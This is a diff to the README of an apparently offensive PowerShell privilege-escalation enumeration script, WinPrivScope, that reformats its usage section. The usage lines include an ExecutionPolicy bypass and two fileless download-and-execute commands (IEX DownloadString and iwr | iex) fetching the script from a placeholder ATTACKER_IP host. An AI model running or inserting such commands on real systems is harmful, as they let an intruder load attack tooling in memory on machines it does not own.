@@ -62,13 +62,17 @@ It performs local enumeration only and does not rely on external dependencies.
 ## Usage
 
 ### Local execution
-    powershell -ExecutionPolicy Bypass -File WinPrivScope.ps1
-
+```powershell
+powershell -ExecutionPolicy Bypass -File WinPrivScope.ps1
+```
 ### In-memory execution (IEX)
-    IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/WinPrivScope.ps1')
-
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/WinPrivScope.ps1')
+```
 ### In-memory execution (modern PowerShell)
-    iwr http://ATTACKER_IP/WinPrivScope.ps1 | iex
+```powershell
+iwr http://ATTACKER_IP/WinPrivScope.ps1 | iex
+```
 
 ---
 
